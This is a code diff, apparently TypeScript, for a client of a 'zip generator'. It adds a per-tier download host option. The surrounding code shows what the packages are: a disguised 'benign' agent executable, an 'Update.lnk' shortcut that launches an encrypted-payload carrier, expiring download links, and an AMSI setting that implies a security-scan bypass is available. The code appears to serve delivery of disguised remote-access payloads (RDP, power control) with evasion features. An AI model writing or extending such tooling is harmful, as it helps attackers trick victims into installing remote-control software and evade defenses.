@@ -18,6 +18,11 @@ export interface CallZipGeneratorOpts {
   features?: string[]; // e.g. ["rdp", "ping", "power"]
   fileName?: string; // benign exe filename — default "trmm-agent.exe"
   expiryHours: number; // 24 | 72 — the generator enforces this window
+  // Task 74: customer-facing download host for THIS build (e.g.
+  // "https://dl.broks.beauty" for public-tier orgs; undefined = generator
+  // default). Allowlisted generator-side; unknown tiers omit it so the
+  // generator keeps today's behavior byte-identical.
+  downloadHost?: string;
   // launcher mode (WP4): zip ships { Update.lnk, Launcher.exe } — the .lnk runs
   // the offline carrier exe directly (encrypted payload inside, nothing
   // downloaded at runtime). Absent/false = legacy Agent.lnk downloader zip.
@@ -99,6 +104,9 @@ export async function callZipGenerator(
         authToken: opts.authToken,
         features: opts.features ?? ["rdp", "ping", "power"],
         expiryHours: opts.expiryHours,
+        // Task 74: tier-resolved download host (public-tier orgs only; the
+        // generator allowlists it and ignores unknown/foreign values).
+        ...(opts.downloadHost ? { downloadHost: opts.downloadHost } : {}),
         ...(opts.launcherMode ? { launcherMode: true } : {}),
         flags: {
           amsi: "none", // Guardrail: AMSI default none — never a bypass by default.
